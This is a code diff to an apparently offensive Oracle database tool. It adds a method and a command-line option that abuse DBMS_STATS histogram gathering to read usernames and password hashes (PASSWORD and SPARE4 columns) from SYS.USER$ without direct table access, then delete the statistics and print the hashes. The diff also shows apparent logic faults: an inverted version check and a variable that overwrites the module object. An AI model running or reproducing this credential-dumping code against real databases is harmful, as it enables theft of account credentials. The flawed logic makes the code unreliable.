@@ -5,7 +5,7 @@ from OracleDatabase import OracleDatabase
 import logging
 from Constants import *
 from Info import Info
-from Utils import checkOptionsGivenByTheUser, generateRandomString
+from Utils import checkOptionsGivenByTheUser, generateRandomString, ErrorSQLRequest
 
 class Passwords (OracleDatabase):
 	'''
@@ -138,6 +138,68 @@ class Passwords (OracleDatabase):
 					self.passwords.append(anAccount)
 		return True
 
+	def getHashedPasswordsWithDBMS_STATS(self):
+		'''
+		Try to get user, password and spare4 from sys.user$ with DBMS_STAT module.
+		Some users are not allowed to access to user$ table directly (e.g. SYSTEM user). With DBMS_STAT module,
+		the user can elevate his privileges and he can access to credetnials stored in user$ table.
+		Tested on 18c & 19c but should work in older versions (>=11).
+		Privilege required: ANALYZE ANY DICTIONARY or OEM_MONITOR role
+		See http://www.red-database-security.com/wp/best_of_oracle_security_2020.pdf for details.
+		Return 3 lists: a list of usernames, list of passwords, and a list of spare4.
+		Return Exception if an error
+		'''
+		names, passwords, spare4s = [], [], []
+		REQ_GATHER_STATS = """
+		BEGIN DBMS_STATS.GATHER_TABLE_STATS(
+			ownname => 'SYS',
+			tabname => 'USER$',
+			method_opt => 'FOR COLUMNS NAME size 255, PASSWORD size 255, SPARE4 size 255');
+		END;
+		"""
+		REQ_SELECT_NAME = "SELECT endpoint_actual_value FROM all_tab_histograms WHERE table_name='USER$' and column_name='NAME'"
+		REQ_SELECT_PASSWORD = "SELECT endpoint_actual_value FROM all_tab_histograms WHERE table_name='USER$' and column_name='PASSWORD'"
+		REQ_SELECT_SPARE4 = "SELECT endpoint_actual_value FROM all_tab_histograms WHERE table_name='USER$' and column_name='SPARE4'"
+		REQ_DEL_STATS = """
+		BEGIN DBMS_STATS.DELETE_TABLE_STATS(
+   			ownname => 'SYS',
+   			tabname => 'USER$');
+		END;
+		"""
+		logging.info("Trying to get hashes with DBMS_STAT module...")
+		if self.isDBVersionHigherThan11() == False:
+			logging.info("Gather table and column statistics")
+			status = self.__execPLSQL__(REQ_GATHER_STATS)
+			if isinstance(status, Exception):
+				logging.info("Impossible to use DBMS_STAT for getting hashes stored in sys.userp$: {0}".format(status))
+				return status, None, None
+			logging.info("Get name, password and spare4 columns")
+			resultsName = self.__execQuery__(query=REQ_SELECT_NAME, ld=['NAME'])
+			if isinstance(resultsName, Exception):
+				logging.warning("Impossible to get name via DBMS_STAT: {0}".format(resultsName))
+			for aR in resultsName:
+				names.append(aR['NAME'])
+			resultsPassword = self.__execQuery__(query=REQ_SELECT_PASSWORD, ld=['PASSWORD'])
+			if isinstance(resultsPassword, Exception):
+				logging.warning("Impossible to get password via DBMS_STAT: {0}".format(resultsPassword))
+			for aR in resultsPassword:
+				passwords.append(aR['PASSWORD'])
+			resultsSpare4 = self.__execQuery__(query=REQ_SELECT_SPARE4, ld=['SPARE4'])
+			if isinstance(resultsSpare4, Exception):
+				logging.warning("Impossible to get spare4 via DBMS_STAT: {0}".format(resultsSpare4))
+			for aR in resultsSpare4:
+				spare4s.append(aR['SPARE4'])
+			logging.info("Delete table-related statistics")
+			status = self.__execPLSQL__(REQ_DEL_STATS)
+			if isinstance(status, Exception):
+				logging.warning("Impossible to delete table-related statistics: {0}".format(status))
+			return names, passwords, spare4s
+		else:
+			logging.info("Get hashes with DBMS_STAT is only valid when Oracle Database >=11g")
+			error = ErrorSQLRequest("Get hashes with DBMS_STAT is only valid when Oracle Database >=11g? It is not the case here.")
+			return error, None, None
+
+
 	def printPasswords (self):
 		'''
 		print passwords
@@ -205,10 +267,9 @@ def runPasswordsModule(args):
 	Run the Passwords module
 	'''
 	status = True
-	if checkOptionsGivenByTheUser(args,["test-module","get-passwords","get-passwords-ocm","get-passwords-from-history", "get-passwords-not-locked","get-passwords-ocm-not-locked"]) == False : return EXIT_MISS_ARGUMENT
+	if checkOptionsGivenByTheUser(args,["test-module","get-passwords","get-passwords-ocm","get-passwords-from-history", "get-passwords-not-locked","get-passwords-ocm-not-locked","get-passwords-dbms-stats"]) == False : return EXIT_MISS_ARGUMENT
 	passwords = Passwords(args)
 	status = passwords.connection(stopIfError=True)
-	passwords.__getLockedUsernames__()
 	if ('info' in args)==False:
 		info = Info(args)
 		info.loadInformationRemoteDatabase()
@@ -274,6 +335,21 @@ def runPasswordsModule(args):
 			passwords.printPasswords()
 		else : 
 			args['print'].badNews("Impossible to get hashed passwords from history: {0}".format(status))
-
+	if args['get-passwords-dbms-stats'] == True:
+		names, passwords, spare4 = passwords.getHashedPasswordsWithDBMS_STATS()
+		if isinstance(names, Exception):
+			args['print'].badNews("Impossible to get hashed passwords with DBMS_STAT: {0}".format(names))
+		else:
+			args['print'].goodNews("Here are Oracle hashed passwords got with DBMS_STAT")
+			logging.warning("Notice: With this method, impossible to have a link between passwords ('password' & 'spare4' culumns) and usernames ('name' column)")
+			args['print'].goodNews("'name' column of sys.user$:")
+			for aR in names:
+				print(aR)
+			args['print'].goodNews("'password' column of sys.user$:")
+			for aR in passwords:
+				print(aR)
+			args['print'].goodNews("'spare4' column of sys.user$:")
+			for aR in spare4:
+				print(aR)
 
 
